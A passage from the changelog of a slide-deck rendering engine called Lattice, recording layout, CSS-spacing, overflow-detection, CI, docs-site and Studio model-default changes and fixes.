  (`docs/src/playground/deck-config.js`).

- **`compare-table` reshapes to cards on a phone — and is no longer landscape-locked.** A
  wide read-across comparison can't fit a portrait box by paginating rows (its overflow is
  across the columns), so on a portrait/mobile export `compare-table` now RESHAPES: each row
  becomes a card and the column headers become its labelled fields, then the cards
  cover-paginate behind an accent cover (carrying the table's `--spectrum` strip so a split
  reads as the same deck). Every cell survives the transpose; nothing shrinks. This retires
  compare-table's landscape-only lock — it supports **both** orientations now — the first
  step of giving every layout a portrait form for the emailed-link (phone) reader. Page
  density is sized to the field count so a card page never overflows. See
  `engineering/decisions/2026-06-25-retire-landscape-locks-portrait-everything.md`.

- **Every layout now has a portrait form — the last three landscape locks retired.**
  Following `compare-table`, three more layouts drop their landscape-only locks: `compare-code`
  re-authors to one code block per page (`cover-code`); `redline` collapses its `.split` /
  `.three-col` columns to a stacked column in portrait and, when a diff is too long to stack,
  block-splits OLD and NEW onto their own slides (the note riding NEW); and `kanban` gives each
  swim lane its own slide with full-width stacked cards. With `kanban` done, **no layout is
  orientation-locked** — the emailed-link (phone) reader gets a portrait form for the whole
  catalog. See `engineering/decisions/2026-06-25-retire-landscape-locks-portrait-everything.md`.

### Changed

- **Form migration taxonomy made total + a partition guard — closing the `diagram` gap.** A
  pre-launch red-team found `diagram` (a `diagram`-bucket sized-media component) sitting
  un-migrated yet outside every documented exception category. Added an explicit
  `STAGE_DEFERRED` set (the 13 `chart`-bucket layouts + `diagram`) naming the layouts that get
  the masthead band but intentionally keep direct-child sized-media bodies, so every component
  is now in exactly one bucket — `STAGE_MIGRATED` (wrapped), `STAGE_DEFERRED` (band +
  direct-child body), or chrome-exempt sovereign (`FORM_TOGGLE_SKIP`). The drift test now
  asserts that partition is **total and disjoint**, so a new component can never default to
  "unwrapped and undocumented". No render change (`diagram` already gets section-level overflow
  detection); the offscreen Mermaid pre-render is untouched. Synced the stale doc surfaces:
  `forms.md` (named `redline` as un-migrated — it is migrated), `marp-independence.md` +
  `lib/engine/index.js` (engine is the canonical shipping render path, not "experimental / P1"),
  and `design-system.md` (referenced the deleted `marp.config.js`).
- **`redline` migrates into the `.cell-stage` cell-tree — completing the standard-component
  migration (#587).** The diff component was the last standard layout on direct-child bodies; its
  body (the OLD/NEW blockquotes + annotation/rationale list) now wraps into the frame's bounded
  `.cell-stage`, and its `.split` / `.three-col` read-across grids live on the stage cell. The
  visible layout is unchanged in every variant (default / annotated / three-col / split / stacked,
  both moods — verified before/after); the gain is detection: an over-stuffed redline now clips at —
  and is **reported at** — the stage edge by the overflow probe's `.cell-stage` selector, instead of
  silently inside a column. `STAGE_MIGRATED` now covers all standard components.
- **Mermaid theme-var maps reconciled across render paths + a lockstep gate (part of #511).** The
  build map (`MERMAID_VAR_MAP`, exported PDF/PPTX/PNG) and the runtime map (preview / HTML export)
  had silently drifted by 8 keys — the runtime themed ER attribute-row fills and xy-chart axis
  lines/ticks the build map didn't, and vice-versa for `taskTextClickableColor`. Added the missing
  keys to both so they theme the **identical** Mermaid key set, and added a unit gate
  (`test/unit/mermaid/mermaid-var-map.test.js`) that fails if the two ever diverge again. Render
  impact is negligible — the previously-unthemed ER fills already resolved on-brand via Mermaid's
  own `background`/`mainBkg` derivation, so only the xy-chart axis tint shifts (sub-pixel, on-brand).
  The remaining token-value disagreements between the two maps are tracked on #511.
  `lib/components/**/*.gallery.{light,dark}.pdf` catalog snapshots had drifted from what the engine
  actually renders — accumulated staleness from CSS/engine changes that shipped without a gallery
  rebuild (chiefly the chart-family masthead lift, which moved titles from centered to a left-aligned
  masthead band, plus the Form cell-tree spacing). A full `npm run build:galleries` re-render moved
  **772 slides across 98 gallery·moods**, reviewed per-slide against the prior goldens
  (`tools/golden-diff.mjs` before │ after │ overlay montages) plus a deterministic overflow re-scan.
  No engine behavior changed — this catches the committed artifacts up to already-shipped rendering.
- **Fixed three masthead-lift overflow regressions the refresh exposed (#569).** The taller masthead
  had begun clipping the densest gallery slides on current `main` (caught by the refresh, not caused
  by it): `kpi` (default/attention/compliance + the dark/accent compositions that reuse default) had
  its fourth metric collide with the footer; `citation-card` and `timeline-list` overlapped cards on
  their "When NOT to reach for…" anti-pattern slides. Trimmed the over-long sample headlines and
  anti-pattern prose in the three manifests so the supported content fits under the lifted masthead;
  every affected slide now passes the overflow probe in both moods. (The underlying capacity question
  — a default `kpi` holding four rows under a two-line headline — is tracked separately for a layout
  fix rather than papered over here.)
- **`logo-wall` marks are now token-coloured silhouettes — palette-driven, theme/mode-adaptive,
  AA on any ground.** A mark was a desaturated `<img>` (a CSS `filter` grey that couldn't follow
  the palette and fell below AA on a dark canvas). The new `logo-marks` transformer
  (`lib/transformers/logo-marks.js`) rewrites each mark to a `<span class="logo-mark">` whose SVG
  rides as a CSS `mask` and whose fill is `var(--logo-ink)` — a real token that resolves per theme
  and per colour-mode via `light-dark()`, so the whole wall re-tones for free and stays AA. The
  `color` variant cycles the categorical `--cat-*-mark` hues (1..12) per mark instead of the single
  muted default — on-palette colour, not raw brand hex. The twelve placeholder marks are redrawn as
  monochrome silhouettes (real transparency for negative space; `fill="currentColor"`). The preview
  uses the mask; the PDF/export path inlines the mark's SVG vector instead (CSS mask doesn't render
  reliably across PDF viewers), so exported decks stay crisp everywhere. **Breaking:** a `logo-wall`
  mark must be a clean vector silhouette — a raster PNG, or an SVG whose negative space is a white
  fill rather than transparency, no longer reads. See `lib/components/inventory/logo-wall/logo-wall.docs.md`.
- **No-margins spacing model (phase 1, cell-tree) — margins out, `gap` in; stage height
  reclaimed.** Margins fight the virtual-list `scrollHeight` measurement (they collapse and
  sit outside the flex content box), so: the masthead band's `margin-bottom` becomes a `gap`
  on the frame's section flex column, scoped to masthead-bearing slides
  (`section:has(> .cell-masthead)`) so sovereign frames are untouched; that gap is **halved**
  from the legacy doubled spacing, the `--footer-reserve` trims its `--sp-md` to `--sp-sm`, and
  a band-local `margin:0` neutralises the pre-lift component `h2 { margin-bottom }` rules that
  were adding stray height above the hairline. Net: ~`--sp-md` of stage height back on every
  slide (most in portrait), easing clipping. First step toward a margin-free cell tree (the
  component-level margin→`gap` sweep follows).
- **No-margins spacing model (phase 2, component sweep) — every component CSS margin retired.**
  Completing phase 1: all 222 spacing margins across `lib/components/**/*.styles.css` are gone,
  converted to the measurable, in-box equivalents — a `gap` on the flex parent (transparent
  inter-element space), `padding` on chrome-free elements (asymmetric or per-sibling space), or
  a flex/grid restructure where a `margin:auto` was doing layout (right-anchored pills →
  `justify-content:space-between`, absolute placement, or a `flex:1` spacer; centred bodies →
  pseudo/flex spacers or a pinned-heading + centred-body split). The only `margin` left in
  component CSS is the `margin:0` reset. Two guardrails the sweep surfaced and respects:
  `padding` never replaces a transparent gap that sat **outside** a filled or bordered box
  (it would extend the fill — e.g. a kanban lane underline stays inset via a gradient, not
  padding); and a converted `padding-bottom`/`-top` pairs with a `margin:0` reset wherever a
  base `section h2/h3/p` margin would otherwise leak through and double the spacing. Renders
  verified pixel-equivalent to the prior build across the component galleries in both themes.
- **No-margins spacing model (phase 3, independent base/contract/forms slices) — 39 → 12.**
  Extending the sweep past the components into the shared layers it had left out: the
  chart-family frame (header/body/caption → flex centering + `gap`, the canvas float → a
  section `row-gap`), the four inventory-contract Layouts (ledger/cards/timeline/editorial —
  list and insight spacings to `padding`/`gap`, with the accent insight band's gap parked on
  the adjacent no-bg sibling so its fill never bleeds), the Form footer chrome (the running
  footer text now pins absolutely to the band's left edge instead of riding a
  `margin-right:auto`, and the progress label's trailing space is `padding`), and the
  independent `base.modifiers` spacings (the KEY-INSIGHT label, inline emoji + glyph
  horizontals, and the carousel split-cover divs). The mermaid-error block's gap moves onto
  its preceding `.mermaid` sibling via `:has`, off the bordered box. The **12** that remain are
  the keystone base typography rhythm (`base.elements` h2–h6 + p + hr, plus four collapse- and
  masthead-sensitive `base.modifiers` prose/quote/display-math spacings) — deferred to a
  stage-flow design-doc pass — and **one** sanctioned, irreducible flex auto-margin (the
  trailing list pill, whose preceding label is an anonymous text run that can't take `flex:1`;
  horizontal-only, so it never touches the height math the rule guards). `MARGIN_BUDGET`
  ratcheted 39 → 12. Renders verified pixel-equivalent (inventory Layouts in both Form-off and
  Form modes; the footer + progress band) to the prior build.
- **Flex-shop conversion, hard tier — `pricing`, `logo-wall`, `citation-card.split`,
  `verdict-grid`, `cards-grid` drop CSS grid for flex.** `pricing` / `logo-wall` were
  `repeat(N,1fr)` tilings → flex-wrap with `width: 100%/N − …` per-cell (the matrix-2x2 idiom;
  `width`, not a `flex`-shorthand calc basis, which renders unreliably); `citation-card.split`
  was a 2-column row → two `flex:1` columns; `verdict-grid` and `cards-grid` were
  `1fr 1fr + grid-auto-rows:1fr` 2-col boards (with a last-odd full-width span, and `cards-grid`
  cards an inner title|badge + full-width-body grid) → flex-wrap whose wrapped rows stretch to
  share the stage (`align-content:stretch`), each card the actors two-cells-then-full-width
  pattern; `.three` / `.four` set the per-card width. Look-preserving in light + dark across
  every variant. **The "hard tier" was largely mislabelled** — reassessed against the proven
  flex patterns, these were nested-1D or fixed tilings; the equal-height-variable-rows case
  that flex supposedly couldn't do is just `align-content:stretch` + matrix `width`. (Still
  pending: `kpi`'s bespoke variants and `citation-card`'s `.margin` / `.triptych`, the only
  genuine multi-track 2-D layouts.)
- **Flex-shop conversion, moderate tier — `actors`, `authority-chain`, `agenda`,
  `list-criteria`, `q-and-a` drop CSS grid for flex.** Each row's `grid-template-columns`
  layout is reproduced with flex: the `actors` and `authority-chain` rows use the
  two-cells-then-full-width flex-wrap pattern (header on row 1, body wraps to a full-width
  row 2); the four `agenda` styles (circles / rail / cards / checks) become `display:flex`
  marker-plus-content rows, with the `rail` node ring centred in its gutter by symmetric
  margins; `list-criteria`'s bare-renderer fallback (the shipped `.crit-body` path is already
  flex) becomes a flex column with an absolutely-positioned index gutter. **`q-and-a`** now
  opts into the shared `slotLabelLift` kernel rule so its question is wrapped in `<strong>` —
  giving flex a selectable hook — and its two formerly-grid looks convert: `rail`
  (number | question | answer) splits the question/answer 46:54 via `flex-grow`, and `grid`
  tiles a 2×2 quadrant (the matrix-2x2 flex recipe) with the question reserving a 3em row so
  answers baseline-align. Look-preserving across every variant and portrait reflow; the only
  authoring effect is the (visually transparent) question wrapper.
- **Breaking:** **The slide-deck wrapper class is now `div.lattice`, not `div.marpit`.**
  The owned engine, emulator, playground, runtime FIT, the CSS scaffold, and the
  CLI chart-export all keyed off Marp's `.marpit` wrapper name purely as a
  historical interop convention — but every first-party path is rendered by
  Lattice's own engine, so the name is now Lattice's own (`div.lattice`). Internal
  Marpit-pack markers (`:marpit-root/container/slide`) and the dead `marpit_comment`
  token are likewise gone. **The Export-to-Marp bundle is unaffected and
  byte-identical:** Marp renders the bundle and emits *its own* `div.marpit`
  wrapper, scoping our (name-free) `lattice.css` onto it — nothing Lattice ships
  into the bundle ever named the wrapper. Rendered PDFs/PPTX are pixel-identical;
  only the **HTML export's wrapper class string** changes. Any external consumer
  that scripts the rendered DOM by `.marpit` (e.g. a host embedding the engine)
  must switch to `.lattice`.

- **The integration test tier is split into a PR slice and a nightly slice.** The
  required CI gate (`test:integration:pr`) now runs only the cross-render-path
  wiring suites (`parity/`), the export pipeline (`export/`), and the
  per-component computed-style correctness gate (`invariants/`). The heavier
  fresh-render regression suites — gallery/component/exemplar page counts, the
  45-deck exemplar render, mermaid-smoke, and screenshot — moved to a nightly
  run on `main` (`test:integration:nightly`, `.github/workflows/integration-nightly.yml`),
  which files a single rolling tracking issue on failure. This cuts PR-critical-path
  time; the moved suites' stale-committed-artifact catches are already backstopped
  at pre-commit, and `LATTICE_FULL_PUSH=1` still runs the full tier pre-push.
  Rationale: `engineering/decisions/2026-06-27-integration-nightly-split.md`.

- **`statute-stack` cards redesigned around a two-pill anatomy keyed to card shape.**
  Every card carries a **citation pill** (neutral outline — an identifier, identical across
  cards) and a **status pill** (jurisdiction-hued — the signal colour); placement follows
  the card's shape so pills never collide and wrap:
  - **Row cards** (`hierarchy` weighted cascade, `bands` scorecard, `preemption` flow —
    full-width) put both pills on the header line: citation left after the label, status
    right. Authoring: `- Federal \`cite\` \`status\``.
  - **Column cards** (the narrow 3-rail default) split them to opposite corners: citation
    right-anchored in the header, status at the card foot bottom-left below the content.
    Authoring: `- Federal \`cite\`` with the status as the last body `code`.

  The row variants now re-arrange this shared card rather than each carrying a bespoke
  label-column layout — denser and visually consistent; the `lane` table is unchanged. The
  legacy body-citation authoring still renders (hanging chip + foot pill). Part of the
  flex-shop conversion: `statute-stack` carries no CSS grid.
- **Breaking: the Form composition model is now ON by default.** Every deck
  renders with the masthead band (lifted eyebrow + title), the meta/status bay,
  and the footer progress rail unless it opts out — an absent `form:` front-matter
  key now resolves to `standard` (was `off`). Opt out per deck with `form: off`
  (or quieten with `form: minimal`); per slide with `no-form`. The sovereign
  Frames (title, divider, closing, image, math, compare-code, split-panel,
  split-compare) stay chrome-exempt, and chart-frame components compose with the
  band (their own subtitle/caption/body are untouched). The flip lives in the
  single shared `readFormMode` kernel, so the emulator, marp-cli, and runtime
  paths inherit it in lock-step (HARD RULE 1); page counts are section-count-stable
  so the gallery gates hold. Decks that want the previous bare-chrome look must add
  `form: off`. See `design/forms.md` and `engineering/decisions/2026-06-11-islands.md`.
- **The docs site is moving to its own domain, `lattice.style`, served at the root.**
  Production is now a GitHub Pages site on the `lattice.style` custom domain (DNS via
  Cloudflare, registrar Squarespace), so it serves at the ROOT path instead of the old
  project-page `/lattice/` base. `astro.config.mjs` sets `base: '/'` in every environment
  and `site` falls back to `https://lattice.style`; a committed `docs/public/CNAME` pins the
  custom domain across deploys. The `/lattice` project-page base is retired, so the
  build-time `rehype-base-links` plugin (which prefixed that base onto root-relative
  Markdown links) is removed. **Cloudflare Pages PR previews are unaffected** — they already
  served at the root with their own `CF_PAGES_URL`/`SITE_URL` origin, and that branch is
  unchanged.

- **The orientation-mismatch deck-lint is retired.** With every layout now carrying a portrait
  form, no layout declares `orientation: ["landscape"]`, so the warning that fired when a
  landscape-only layout was used in a portrait deck had nothing left to guard. The rule and its
  now-empty `LANDSCAPE_ONLY_LAYOUTS` / `PORTRAIT_ONLY_LAYOUTS` / `AUTOSPLIT_ADAPTS` lists are
  removed (the Fit Spine's earn-its-keep axiom — delete dormant mechanisms, don't park them).
  The manifest `orientation` contract is still validated at build time by `check-ownership`, so
  a future lock can't land unnoticed.

- **Auto-split is now scoped to portrait/square `@sizes` — a universal, enforced rule.**
  The Fit Ladder's SPLIT move (`autosplit: on`) is a portrait-family behavior: in a
  wide/landscape box, collapse + shed resolve overflow before split is ever reached, so
  the move only makes sense at a portrait, story, mobile, or square `@size`. This intent
  lived in the design docs and `lint-core`'s `PORTRAIT_SIZES`, but nothing enforced it —
  the engine happily split a 4K landscape deck, and the canonical demo (`examples/auto-split.md`)
  shipped at `size: 4K`, modelling the wrong thing. Now: (1) the emulator **skips both
  auto-split passes at a landscape `@size`** (with a one-line notice) so the HD/4K PDF stays
  byte-identical; (2) `lint:deck` warns on `autosplit: on` + a landscape `@size` (new rule
  `autosplit-landscape-noop`); (3) the capacity-overflow suppression that `autosplit: on`
  grants is itself gated on portrait, so a landscape autosplit deck still surfaces real
  overflow; (4) the demo deck moves to `size: portrait`; (5) the rule is documented in the
  manifest schema's `capacity.escalateTo` contract. See
  `engineering/decisions/2026-06-22-the-fit-spine.md` §3 and `2026-06-23-read-across-carousel.md`.

### Changed

- **HARD RULE #20 reaches zero: no `margin` in engine layout CSS.** The last keystone —
  the base block-flow typographic rhythm (`section h2…h6 / p { margin-bottom }`, the `hr`
  centering, and the eyebrow / KEY-INSIGHT / below-note / display-math riders) — now lives
  on the `.cell-stage` flow `gap` + `padding` instead of per-element margins. margin is
  invisible to the overflow probe / autosplit and margin-collapses, so it corrupted the
  height math a measuring layout depends on; `gap`/`padding` measure cleanly and leave no
  trailing space inside the clip. The budget ratchet is replaced by a hard **layout budget
  of 0 + a one-entry sanctioned allowlist** (the irreducible flex `margin-left:auto` push),
  and the gate now also fails on a *stale* sanction so the allowlist can't rot. Prose
  rhythm is unchanged to the eye (the stage owns the same `--sp-xs` step the cascade
  margins carried; under Form the title h2 lifts to the masthead, so the in-stage rhythm
  was already uniform). See `engineering/decisions/2026-06-27-stage-flow-no-margins.md`.

### Fixed

- **Studio AI models can't rot anymore — defaults use OpenRouter's `~*-latest` alias (#610, closes #614).**
  Pinned model ids die when OpenRouter retires/renames a model (a `404 "No endpoints found"`), which bit
  us three times. Now: the connect-time/Studio **defaults are the server-resolved `~vendor/family-latest`
  aliases** (`~anthropic/claude-sonnet-latest` / `~anthropic/claude-haiku-latest`), so they always track the
  current version and never 404. The curated model picker lists are **family prefixes** (`anthropic/claude-sonnet`)
  matched against the live catalog, not pinned ids — a version bump stays featured and a retired id can't strand
  a lens. The `/models` catalog is **TTL-cached in localStorage** (24h, served stale on fetch failure), and a
  chat call that fails with the dead-model signature **self-heals** — retries once with the alias and refreshes
  the catalog. A unit test guards that every curated family still resolves. See
  `engineering/decisions/2026-06-29-studio-model-liveness.md`.

- **Studio AI's default model no longer 404s (#610).** The Studio's connect-time default was
  `anthropic/claude-3.5-haiku`, a slug OpenRouter no longer serves (`No endpoints found`) — so a
  fresh user's first AI action failed. It now defaults to `anthropic/claude-haiku-4.5` (current
  cheap Claude). Verified end-to-end against the live API: a "Describe a look" prompt returns a
  full essentials + ramp-strategy set that derives AA-clean in both canvas modes. (Two further
  dead ids in the curated model picker are tracked separately in #614.)

- **Studio: the Insert-component palette works in the built app again (#595).**
  `studio.astro` read the component catalog (`dist/docs/components.json`) via an
  `import.meta.url`-relative path that misses under `astro build` — the page
  frontmatter is bundled into a chunk that no longer sits at `src/pages/`, so the
  read silently caught and left the catalog empty, disabling Insert (and the
  "Insert a component…" command) in the production build. Now resolved from
  `process.cwd()`, matching the file's own lint-vocab read. Surfaced by the new
  Studio E2E suite.
- **The overflow ring no longer false-fires on a clean slide whose cell holds an
  absolutely-positioned footer (the #198 4K case).** The cell-aware probe measures how far a
  clip cell's children spill past the cell box (to catch centred content clipped off an edge),
  but it counted OUT-OF-FLOW children too — a full-width `<footer>` docked inside a half-width
  `.panel-right` is `position:absolute`, so its layout box sits ~a panel-width to the left of
  the cell, which the probe read as a panel-width of horizontal overflow and tripped the ring
  on a slide that renders perfectly (split-panel watermark at `size: 4K`). The probe now skips
  `position:absolute`/`fixed` children — that's placement, not content overflow; an out-of-flow
  element's own overflow is still caught by the cell's `scrollWidth/Height` and the section box.
  In-flow centred-overflow detection is unchanged. Closes #198.
- **`split-panel watermark` numbered cards: the bold header now left-aligns with its body
  text.** The numbered (`ol`) card insets its header `1.25cqi` from the accent counter, but a
  shared body rule (meant for the plain `ul` card, whose header has no inset) clobbered the
  numbered card's body padding to `0` — so the body sat a notch left of its header. The body
  inset is now scoped to the numbered card (a doubled-class bump so it wins regardless of
  source order) and carries `box-sizing: border-box` so the `width:100%` body doesn't spill
  its right edge; the plain `ul` card is unchanged (header and body already flush). Verified
  light + dark across both card shapes. (#198)
- **Docs say "component", and the count reads 53 — the terminology sweep is finished.**
  Completes #560 on top of #561/#563: the author-facing docs-site prose that still called a
  component a "layout" (the landing/getting-started/principles pages and the authoring + spec
  guides — `introduction.md`, `getting-started.md`, `principles.md`, `guides/authoring.md`,
  `guides/themes.md`, `404.md`, `spec/understanding-lfm.md`) now says **component**; the
  legitimate architectural senses (the Forms "Layout" axis, "layout CSS", grid/geometry, the
  LFM "stable surfaces" contract term) are deliberately left. Reconciled the post-#563 count
  to **53** everywhere it had drifted (`design-system.gallery.md`'s rendered deck still read
  "52 components"; `introduction.md` read "Fifty-two"), and added the `inventory` component to
  the Inventory-bucket example list in `design/design-system.md`. (Repo description is a
  Settings-level field with no API hook — still on the maintainer to update.)
- **`redline three-col` (and `split`) no longer clip their card prose under Form.** redline
  draws its own `section`-level grid and isn't `.cell-stage`-migrated, so the masthead band
  the Form lifts (eyebrow + title) auto-flowed into the grid's narrow first cell — the title
  wrapped to three lines, inflating the header row until the OLD/NEW cards lost the height to
  hold their text and clipped. Span the lifted `.cell-masthead` across all columns on row 1
  (mirroring the non-Form `h2 { grid-column: 1/-1 }`), so the title fits one line and the
  cards keep their full track. Also tuned the three-col cards for their narrow columns —
  snug line-height + tighter block padding, a wider OLD/NEW : narrower WHY column ratio
  (the rationale pills under-fill their track), and trimmed the NEW sample's trailing clause
  to match OLD's density. Verified light + dark; the gallery renders overflow-clean. (#569)
- **`q-and-a spine` no longer clips its answer text at the right frame edge.** The base
  `q-and-a` list is `width: 100%`, and the `spine` look adds its own `padding-left` to that
  same list; because `box-sizing` isn't inherited (only `section` sets it), the list was
  `content-box`, so `100% + padding` pushed the answer column past the stage's right edge and
  a long answer line was horizontally clipped. The spine list is now `box-sizing: border-box`,
  so its padding is absorbed within the 100% width. Verified light + dark on the gallery's
  3-pair stress sample. (#547)
- **Playground previews now load relative inline images (e.g. `logo-wall` marks).** The
  engine resolved `![bg]` backgrounds against the asset `baseUrl` but left a prose
  `<img src="acme.svg">` relative, so it 404'd inside the preview's srcdoc iframe (the
  component studio rendered broken marks). `lib/core/bg-image.js` gains
  `resolveInlineImageSrcs`, applied at the end of the engine's HTML render, which rebases
  relative inline `<img>` srcs against `baseUrl` the same way — remote/absolute/data URLs
  pass through. The CLI/emulator/export path passes no `baseUrl`, so it's a no-op there and
  exported bytes are unchanged.
- **The overflow probe now catches centred (and bottom-anchored) content that clips its
  head.** `lib/core/overflow-probe.js` measured a bounded content cell's overflow as
  `scrollHeight - clientHeight`, which silently UNDER-reports a `justify-content: center`
  body: content clipped off the *top* sits at a negative offset `scrollHeight` never
  counts, so a too-tall centred cell read as ~half its real overflow — or zero — and the
  red ring, the export "Overflows" warning, and runtime autosplit all stayed quiet while
  the slide visibly clipped its title. The probe now also measures the true content spill
  past the cell box from the children's layout rects (`getBoundingClientRect`, which
  returns the layout box regardless of clip) and takes the larger of the two — flex-start
  stays correct, centre / flex-end get caught. (Surfaced while fixing an `inventory`
  sample that clipped its head under `center`; the single-sourced probe feeds the preview
  watcher, the export watcher, and autosplit, so the fix lands everywhere at once.)
- **Docs say "component", and the counts/links are honest.** Standardized the user-facing
  vocabulary on **component** (retiring "layout" as a synonym) across the README, the docs-site
  pages and guides, `AGENTS.md`, and the component-reference generator — so a reader meets one
  word for the 52 things, not three. Alongside: three docs-site links into a non-existent
  `reference/` directory now point at the real files (`design/theming.md`, `dist/docs/components.md`,
  `design/skill.md`); the themes guide's palette list adds the omitted `carta` (now 14, matching
  the README); and `engineering/marp-independence.md`'s stale "53" count is corrected to 52. The
  four inventory **variants** (`layout-ledger`/`-cards`/`-timeline`/`-editorial` — one authored
  content shape, four interchangeable looks) are now documented in the authoring guide as variants
  (not counted as components; the headline stays an accurate "52 components"). Internal code
  identifiers and the `layout-*` class names are unchanged; the deeper model/spec prose and the
  per-component `.docs.md` source are tracked for a follow-up (#560).
- **The inventory contract Layouts (`layout-ledger` / `layout-cards` / `layout-timeline` /
  `layout-editorial`) render again under Form (the default) — they were silently falling back
  to a plain list.** Form wraps a migrated layout's body in the `.cell-stage` cell, but these
  four contract-tier Layouts were absent from the masthead kernel's layout registry
  (`ALL_LAYOUTS`, built from the *component* manifest), so the wrap detector classified them as
  generic prose and wrapped them — and their CSS still addressed `section.layout-* > ul`, a
  direct child that the wrapper now hid, so every look collapsed to the base list. Registered the
  four as a sibling tier (`ALL_LAYOUTS` + `STAGE_MIGRATED`, the drift test now asserting the set
  is components ∪ contract Layouts) and migrated their CSS to `section.layout-* > .cell-stage > …`
  — the same idiom every component uses. The body is now the bounded stage cell: the title +
  eyebrow lift into the masthead band, and the list/insight clip cleanly instead of bleeding past
  the footer. `ledger` row rhythm tightened to seat four rows + the accent band in the (shorter,
  masthead-topped) stage; `editorial` reads as insight ∥ items with the title in the band.
  Verified light + dark across all four. (Found during the no-margins sweep; logged as a separate
  fix to keep that PR scoped.)
- **The masthead band no longer steals stage height from a lifted title's converted padding —
  `kpi` stops clipping.** The no-margins sweep converted some components' `section.X h2 {
  margin-bottom }` to `padding-bottom`; lifted into the masthead band that padding stacked on
  the band's own `padding-bottom`, doubling the title→hairline gap and — because the band is a
  content-height grid — shrinking the stage below it. On the already-tight `kpi` that tipped the
  hero + supports over the stage clip. The band-wide reset now zeroes **both** `margin` and
  `padding-block` on every lifted heading (`section.form .cell-masthead :is(h1–h4)`), so the
  band's own padding is the sole title→hairline control and the stage keeps its full height.
  Corrective for the five other masthead components that carried the same converted padding
  (`stats` / `diagram` / `code` / `content` / `compare-code`).
- **`math` slide titles clear the running header again — uniform with every other slide.**
  The no-margins centring rework had pinned the `derivation`/`theorem` heading at
  `top: var(--sp-lg/xl)`, which sat *inside* the `LATTICE · MATH` eyebrow band (the title
  visibly overlapped it). The pinned title now clears the header by the base section's
  header-clearance (`calc(var(--sp-2xl) + var(--sp-md))` = 6.875cqi, the same berth Form
  slides use), and every `math` variant swaps its `padding-block` override for
  `padding-bottom` so the base top clearance is preserved instead of squeezed — so a math
  headline sits the same distance below the eyebrow as a headline on any Form slide.
- **Split frames no longer bleed their supporting panel past the wall — and the bleed is
  still *detected*.** The flex cell-tree's first frames (`2026-06-26-frames-as-flex-cell-trees.md`):
  `split-panel`'s `.panel-right` and `split-compare`'s `.compare-right` gain the
  `min-height:0; overflow:clip` clip contract, so an over-stuffed supporting zone is
  walled at the panel edge instead of painting past it. Critically, clipping a cell
  HIDES its overflow from the section-level `scrollHeight` watcher — which would have
  silently killed the red overflow ring, the export "Overflows" warning, **and runtime
  autosplit** (it sizes splits from the measured ratio). New `lib/core/overflow-probe.js`
  makes detection **cell-aware** (single-sourced across the preview watcher, the export
  watcher, and `measureOverflow`): a clipped content cell's internal overflow is surfaced
  as section-equivalent extent, so every signal keeps firing and autosplit is byte-for-byte
  unchanged on existing decks. Gallery renders are pixel-identical; only genuinely
  over-stuffed split slides change (now contained).

- **Loading a gallery in the Playground now actually shows the rendered deck.** On the
  mobile single-pane layout, opening Galleries (or any deck swap that auto-advances to
  Preview) flipped the Edit/Preview tab to "Preview" but left the **layout** on Edit, so
  the freshly rendered deck sat in a hidden pane — the only way to see it was to toggle
  Edit→Preview by hand. The cause was two sources of truth for the active pane: the React
  `pane` state (drives the tab highlight) and `document.body[data-pane]` (drives the CSS
  that hides the inactive pane). A tab click synced both; a programmatic switch
  (`applyDeck({ toPreview })`) synced only the first. `pane` is now the single source of
  truth, with `body[data-pane]` mirrored from one effect, so the layout follows the tab no
  matter how the pane changed. Guarded by a behavioural + property-based (fast-check
  model-based, `fc.commands`) test of the toolbar — `PlaygroundApp.test.tsx` — that fuzzes
  random user journeys and asserts the tab and layout never desync (the bug shrinks to the
  one-step counterexample "load a gallery from Edit view"). The Drawing Board's mobile pane
  machine — already correct, but the same divergence class — is hardened the same way: its
  `setPane` is extracted to a shared, single-source-of-truth module
  (`drawing-board-pane.js`) and fuzzed by `drawing-board-pane.test.ts`, which asserts the
  four pane surfaces (`body[data-pane]`, tab `aria-selected`, the persisted pane, the
  preview render) never drift across random click/programmatic journeys.

- **A Playground deck swap no longer double-writes the preview iframe (slow-network flash).**
  Setting the editor source programmatically (loading a gallery, picking a component) fires
  CodeMirror's `onChange` synchronously → a debounced patch render. On a slow connection or a
  large deck that pending render fired ~mid-load and **re-wrote** the iframe srcdoc, reloading
  the preview and flashing (and, before the pane-sync fix above, could leave it blank). The
  authoritative fresh render now cancels that queued debounced render, so a deck swap is a
  single write. Guarded by a NIGHTLY real-browser e2e (`docs/scripts/check-preview-render.mjs`,
  `.github/workflows/preview-e2e-nightly.yml`) that loads a gallery at mobile + desktop and
  asserts the deck actually paints — the jsdom fuzz mocks the engine and can't see the real
  render. On failure it files a single rolling tracking issue with screenshots + a reproduction.

- **A crashed Chrome render fails fast instead of hanging to the outer timeout.** When the
  headless-Chrome renderer/GPU process crashes mid-render (`Protocol error … Target closed`),
  the emulator's awaited CDP calls (`page.goto` / `page.evaluate` / `page.pdf`) could be left
  waiting on a protocol response that never arrived — turning a transient, environmental Chrome
  crash into a multi-minute stall that masked the real signal. Every render call now races
  against the browser's `disconnected` event (a crash rejects in ms) **and** a per-call watchdog
  (`LATTICE_RENDER_WATCHDOG_MS`, default 90 s — a silent wedge with no disconnect event), and a
  wedged render is retried **once** with hardening flags (`--disable-dev-shm-usage --disable-gpu`,
  the classic swiftshader/`/dev/shm` crash fix) before exiting non-zero with a clear message. New
  shared kernel `lib/engine/render-guard.js` (pure, unit-tested in isolation). (#502)
- **A typo'd `size:` directive errors at config time instead of silently rendering wrong.** An
  unregistered size name (e.g. `size: storyy`) used to resolve silently to the first declared
  `@size` — the deck rendered at the wrong geometry with no signal, and a degenerate value could
  wedge the render. The emulator now validates the explicit `size:` against the registered `@size`
  names before any Chrome work and exits non-zero listing the valid sizes. (#502)
- **A split `q-and-a` continues its index instead of restarting at "01".** When an
  overflowing q-and-a paginates (cover-paginate), each body page's list reset the `qa`
  CSS counter, so page 2 began again at "01". The auto-splitter now stamps
  `--lat-split-offset` (the count of pairs on prior body pages) on each body page, and
  `counter-reset: qa var(--lat-split-offset, 0)` carries the numbering across the split
  (…03, 04). Computed post-convergence, so it stays correct even when a page splits
  across several measured passes. An unsplit slide is unchanged (offset 0).

- **A split `compare-code` block now wears the standard code frame.** When an overflowing
  compare-code splits to one block per page (`cover-code`), the block pages rendered the
  highlighted code *naked* on the slide — the `compare-code-block` class never matched the
  unsplit layout's `section.compare-code pre` frame rule. The split block now reuses that
  exact frame (`--code-bg` panel, `--spectrum` accent strip, rounded corners, padding) plus
  the compact code size and last-resort wrap, so a split reads as the same deck.
- **`q-and-a`'s index number no longer collides with the question on portrait.** The "01"
